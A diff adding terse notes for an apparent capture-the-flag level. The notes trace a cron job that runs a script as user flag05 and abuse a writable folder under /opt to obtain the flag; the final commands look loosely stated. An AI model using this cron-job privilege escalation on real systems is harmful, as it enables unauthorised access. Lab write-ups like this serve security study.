@@ -1,0 +1,10 @@
+find -name 'level05' from root
+-> ./var/mail/level05
+cat it
+it says: */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+check da script: ls -l /usr/sbin/openarenaserver
+owned by flag05
+check da folder 
+
+mkdir /opt/openarenaserver/pepe_dir
+getflag > /opt/openarenaserver/pepe_dir/pepe_flag
